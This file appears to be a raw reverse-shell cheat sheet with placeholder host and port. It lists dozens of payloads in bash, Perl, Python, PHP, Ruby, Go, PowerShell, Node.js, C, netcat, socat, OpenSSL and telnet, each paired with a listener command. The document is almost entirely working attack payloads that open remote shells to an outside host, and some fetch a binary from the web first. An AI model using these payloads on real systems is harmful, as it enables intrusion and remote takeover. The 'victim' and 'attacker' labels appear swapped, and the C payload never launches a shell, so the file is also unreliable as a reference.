victim
nc -lvnp £
attacker
bash -i >& /dev/tcp/@/£ 0>&1
victim
nc -lvnp £
attacker
0<&196;exec 196<>/dev/tcp/@/£; sh <&196 >&196 2>&196
victim
nc -ulvnp £
attacker
sh -i >& /dev/udp/@/£ 0>&1
victim
socat file:`tty`,raw,echo=0 TCP-L:£
attacker
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:@:£
victim
nc -lvnp £
attacker
perl -e 'use Socket;$i="@";$p=£;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
victim
nc -lvnp £
attacker
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"@:£");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
victim
nc -lvnp £
attacker
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"@:£");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
victim
nc -lvnp £
attacker
export RHOST="@";export RPORT=£;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
victim
nc -lvnp £
attacker
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("@",£));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
victim
nc -lvnp £
attacker
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("@",£));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
victim
nc -lvnp £
attacker
php -r '$sock=fsockopen("@",£);exec("/bin/sh -i <&3 >&3 2>&3");'
victim
nc -lvnp £
attacker
php -r '$sock=fsockopen("@",£);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
victim
nc -lvnp £
attacker
php -r '$sock=fsockopen("@",£);`/bin/sh -i <&3 >&3 2>&3`;'
victim
nc -lvnp £
attacker
php -r '$sock=fsockopen("@",£);system("/bin/sh -i <&3 >&3 2>&3");'
victim
nc -lvnp £
attacker
php -r '$sock=fsockopen("@",£);passthru("/bin/sh -i <&3 >&3 2>&3");'
victim
nc -lvnp £
attacker
php -r '$sock=fsockopen("@",£);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
victim
nc -lvnp £
attacker
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("@","£");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
victim
nc -lvnp £
attacker
ruby -rsocket -e 'c=TCPSocket.new("@","£");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
victim
nc -lvnp £
attacker
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","@:£");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
victim
nc -lvnp £
attacker
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc @ £ >/tmp/f
victim
nc -lvnp £
attacker
/bin/nc.traditional @ £ -e /bin/bash
victim
nc -lvnp £
attacker
/bin/nc.traditional @ £ -c /bin/bash
victim
nc -lvnp £
attacker
ncat @ £ -e /bin/bash
victim
ncat --ssl -vv -l -p £
attacker
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect @:£ > /tmp/s; rm /tmp/s
victim
yes "" | openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes;openssl s_server -quiet -key key.pem -cert cert.pem -port £
attacker
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect @:£ > /tmp/s; rm /tmp/s
victim
export LHOST="@"; export LPORT="£"; export PSK="1bffb8f86568a31102530d08b16b7326d659de016187b87b1f2a1bc86c6c9c097d216de8e53662ebf92c293add4e879c"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
attacker
export RHOST="@"; export RPORT="£"; export PSK="1bffb8f86568a31102530d08b16b7326d659de016187b87b1f2a1bc86c6c9c097d216de8e53662ebf92c293add4e879c"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
victim
nc -lvnp £
attacker
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("@",£);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
victim
nc -lvnp £
attacker
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('@',£);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
victim
nc -lvnp £
attacker
echo 'set s [socket @ £];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
victim
nc -lvnp £
attacker
gawk 'BEGIN {P=£;S="> ";H="@";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
victim
nc -lvnp £
attacker
echo '(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(£, "@", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();' > rev.js;chmod +x rev.js; nodejs rev.js
victim
nc -lvnp £
attacker
echo '#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = £;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("@");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
}' > shell.c; gcc shell.c -o shell; chmod +x shell; ./shell
victim
nc -lvnp £
attacker
rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet @ £ > f
victim
nc -lvnp £
attacker
rm -f x; mknod x p && telnet @ £ 0<x | /bin/bash 1>x
